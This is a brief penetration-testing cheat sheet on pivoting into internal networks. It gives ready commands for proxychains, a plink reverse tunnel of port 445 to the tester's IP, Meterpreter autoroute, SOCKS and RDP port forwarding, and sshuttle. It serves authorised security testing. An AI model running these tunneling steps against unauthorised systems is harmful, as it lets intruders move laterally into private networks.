# Pivoting

## Tools


* ssh (-D -L -R)
* meterpreter
* plink.exe
* [chisel](https://github.com/jpillora/chisel)
* [reGeorg](https://github.com/sensepost/reGeorg) (web socks proxy)

### Proxychains

We can choose one of the tools to create a socks proxy and configure Proxychains to route into it the traffic of any pentesting tool that has no buit-in options to specify a socks proxy :

```bash
sudo vim /etc/proxychains.conf => changer le port du proxysocks proxychains
proxychains wpscan --url <url> 
wpscan --url <url> --proxy socks5://127.0.0.1:9517 --force
```
> We can also forward a single port to avoid being forced to use a socks proxy.

### Plink

```sh
plink.exe -l root -pw password -R 445:127.0.0.1:445 <your_ip>
```

### Meterpreter

```sh
#Socks Proxy
run autoroute -s <target_network>/24
use auxiliary/server/socks4a
exploit -j

# Port forward
portfwd add -l 3389 -p 3389 -r <target>
```

---

### SSHUTTLE
```sh
sshuttle -r kali@<ip_target>:22 <target_network>/24
```

---

## Nmap like

[PortqryUI](https://www.microsoft.com/en-us/download/details.aspx?id=24009) : Nmap like for windows
